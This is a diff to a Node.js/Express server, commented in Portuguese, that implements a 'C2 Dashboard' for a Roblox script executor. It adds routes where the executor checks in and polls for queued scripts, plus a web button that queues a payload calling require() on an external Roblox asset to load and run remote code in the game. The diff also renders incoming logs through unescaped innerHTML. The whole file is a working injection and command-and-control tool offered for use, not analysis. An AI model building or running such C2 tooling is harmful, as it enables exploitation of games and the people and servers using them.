@@ -14,10 +14,59 @@ app.use(express.text({ type: 'text/plain' }));
 let filaScripts = [];
 let robloxConectado = false;
 let lastPing = 0;
+let serverLogs = [];
 
-// ============================================================================
-// 1. INTERFACE WEB (HTML/CSS/JS)
-// ============================================================================
+function addLog(msg) {
+    console.log(msg);
+    serverLogs.push(`[${new Date().toLocaleTimeString()}] ${msg}`);
+    if (serverLogs.length > 50) serverLogs.shift();
+}
+
+// --- ROTAS DO C2 ---
+
+app.post('/roblox/conectar', (req, res) => {
+    robloxConectado = true;
+    lastPing = Date.now();
+    addLog(`[+] Roblox Conectado (IP: ${req.ip})`);
+    res.json({ ok: true });
+});
+
+app.get('/pegar_script', (req, res) => {
+    lastPing = Date.now();
+    
+    if (filaScripts.length > 0) {
+        const script = filaScripts.shift();
+        addLog(`[>] Enviando payload da fila: ${script}`);
+        res.type('text/plain').send(script); // Força envio como texto puro
+    } else {
+        res.send(''); 
+    }
+});
+
+app.post('/inject', (req, res) => {
+    if (!robloxConectado || (Date.now() - lastPing > 15000)) {
+        return res.status(400).json({ ok: false, erro: "Roblox não está conectado." });
+    }
+
+    const payload = 'require(8038037940).CLoad("nottheunidex")';
+    filaScripts.push(payload);
+    addLog(`[!] Payload enfileirado manualmente pelo Painel.`);
+    res.json({ ok: true });
+});
+
+// Recebe os logs do script Lua no jogo
+app.post('/log', (req, res) => {
+    const msg = req.body.msg || req.body;
+    if (msg) addLog(`[LUA] ${msg}`);
+    res.send('ok');
+});
+
+app.get('/status', (req, res) => {
+    const isAlive = (Date.now() - lastPing) < 15000;
+    res.json({ connected: robloxConectado && isAlive, logs: serverLogs });
+});
+
+// --- INTERFACE HTML ---
 app.get('/', (req, res) => {
     res.send(`
     <!DOCTYPE html>
@@ -25,96 +74,35 @@ app.get('/', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>C2 Control Panel</title>
+        <title>C2 Dashboard</title>
         <style>
-            body {
-                background-color: #0d1117;
-                color: #c9d1d9;
-                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                height: 100vh;
-                margin: 0;
-            }
-            .container {
-                background-color: #161b22;
-                padding: 40px;
-                border-radius: 10px;
-                box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-                text-align: center;
-                border: 1px solid #30363d;
-                width: 350px;
-            }
-            h1 { margin-top: 0; color: #58a6ff; font-size: 24px; }
-            .status-box {
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                margin-bottom: 30px;
-                font-weight: bold;
-                font-size: 18px;
-            }
-            .indicator {
-                width: 15px;
-                height: 15px;
-                border-radius: 50%;
-                margin-right: 10px;
-                background-color: #f85149;
-                box-shadow: 0 0 10px #f85149;
-                transition: all 0.3s ease;
-            }
-            .indicator.online {
-                background-color: #2ea043;
-                box-shadow: 0 0 10px #2ea043;
-            }
-            button {
-                background-color: #238636;
-                color: white;
-                border: none;
-                padding: 12px 24px;
-                font-size: 16px;
-                border-radius: 6px;
-                cursor: pointer;
-                width: 100%;
-                font-weight: bold;
-                transition: background-color 0.2s;
-            }
-            button:hover { background-color: #2ea043; }
-            button:disabled {
-                background-color: #21262d;
-                color: #8b949e;
-                cursor: not-allowed;
-                border: 1px solid #30363d;
-            }
-            .log {
-                margin-top: 20px;
-                font-size: 12px;
-                color: #8b949e;
-                min-height: 20px;
-            }
+            body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+            .container { background-color: #161b22; padding: 20px; border-radius: 10px; border: 1px solid #30363d; width: 450px; }
+            h1 { color: #58a6ff; font-size: 22px; text-align: center; margin-top: 0; }
+            .status-box { display: flex; align-items: center; margin-bottom: 15px; font-weight: bold; }
+            .indicator { width: 12px; height: 12px; border-radius: 50%; margin-right: 10px; background-color: #f85149; box-shadow: 0 0 10px #f85149; transition: 0.3s; }
+            .indicator.online { background-color: #2ea043; box-shadow: 0 0 10px #2ea043; }
+            button { background-color: #238636; color: white; border: none; padding: 12px; font-size: 16px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; }
+            button:disabled { background-color: #21262d; color: #8b949e; cursor: not-allowed; border: 1px solid #30363d; }
+            .log-box { background-color: #010409; border: 1px solid #30363d; height: 150px; overflow-y: auto; margin-top: 15px; padding: 10px; font-family: monospace; font-size: 11px; color: #7ee787; border-radius: 5px; }
         </style>
     </head>
     <body>
         <div class="container">
             <h1>C2 Dashboard</h1>
-            
             <div class="status-box">
                 <div id="indicator" class="indicator"></div>
                 <span id="status-text">Roblox Offline</span>
             </div>
-
             <button id="inject-btn" onclick="injetar()" disabled>INJETAR PAYLOAD</button>
-            <div id="log" class="log"></div>
+            <div id="log-box" class="log-box"></div>
         </div>
-
         <script>
             const indicator = document.getElementById('indicator');
             const statusText = document.getElementById('status-text');
             const injectBtn = document.getElementById('inject-btn');
-            const logDiv = document.getElementById('log');
+            const logBox = document.getElementById('log-box');
 
-            // Verifica o status a cada 2 segundos
             setInterval(async () => {
                 try {
                     const res = await fetch('/status');
@@ -129,30 +117,21 @@ app.get('/', (req, res) => {
                         statusText.innerText = 'Roblox Offline';
                         injectBtn.disabled = true;
                     }
-                } catch (e) {
-                    statusText.innerText = 'Erro de Conexão';
-                }
+
+                    logBox.innerHTML = data.logs.map(l => `<div>> ${l}</div>`).join('');
+                    logBox.scrollTop = logBox.scrollHeight;
+                } catch (e) {}
             }, 2000);
 
-            // Função do botão injetar
             async function injetar() {
                 injectBtn.disabled = true;
-                logDiv.innerText = "Enviando comando para a fila...";
-                
+                injectBtn.innerText = "ENVIANDO...";
                 try {
-                    const res = await fetch('/inject', { method: 'POST' });
-                    const data = await res.json();
-                    
-                    if (data.ok) {
-                        logDiv.innerText = "Payload injetado! O Roblox vai executar em breve.";
-                    } else {
-                        logDiv.innerText = "Erro: " + data.erro;
-                    }
+                    await fetch('/inject', { method: 'POST' });
+                    setTimeout(() => { injectBtn.innerText = "INJETAR PAYLOAD"; }, 2000);
                 } catch (e) {
-                    logDiv.innerText = "Falha ao conectar com o servidor.";
+                    setTimeout(() => { injectBtn.innerText = "INJETAR PAYLOAD"; injectBtn.disabled = false; }, 2000);
                 }
-                
-                setTimeout(() => { injectBtn.disabled = false; logDiv.innerText = ""; }, 3000);
             }
         </script>
     </body>
@@ -160,53 +139,4 @@ app.get('/', (req, res) => {
     `);
 });
 
-// ============================================================================
-// 2. ROTAS DO C2
-// ============================================================================
-
-// O Executor bate aqui para avisar que está online
-app.post('/roblox/conectar', (req, res) => {
-    robloxConectado = true;
-    lastPing = Date.now();
-    console.log(`[ROBLOX] Executor conectado (IP: ${req.ip})`);
-    res.json({ ok: true });
-});
-
-// O Executor bate aqui para puxar scripts
-app.get('/pegar_script', (req, res) => {
-    lastPing = Date.now(); // Mantém o status online
-    
-    if (filaScripts.length > 0) {
-        const script = filaScripts.shift();
-        console.log('[ROBLOX] Enviando payload da fila!');
-        res.send(script);
-    } else {
-        res.send(''); // Fila vazia
-    }
-});
-
-// A UI bate aqui quando você clica no botão
-app.post('/inject', (req, res) => {
-    if (!robloxConectado || (Date.now() - lastPing > 15000)) {
-        return res.status(400).json({ ok: false, erro: "Roblox não está conectado." });
-    }
-
-    const payload = 'require(8038037940).CLoad("nottheunidex")';
-    filaScripts.push(payload);
-    
-    console.log(`[INJECT] Payload enfileirado pelo Painel Web`);
-    res.json({ ok: true });
-});
-
-// A UI usa isso para ver se o Roblox tá vivo
-app.get('/status', (req, res) => {
-    const isAlive = (Date.now() - lastPing) < 15000; // 15s de tolerância
-    res.json({ connected: robloxConectado && isAlive });
-});
-
-// ============================================================================
-// 3. START
-// ============================================================================
-app.listen(PORT, () => {
-    console.log(`[SERVER] Painel rodando na porta ${PORT}`);
-});
+app.listen(PORT, () => console.log(`[SERVER] Online na porta ${PORT}`));
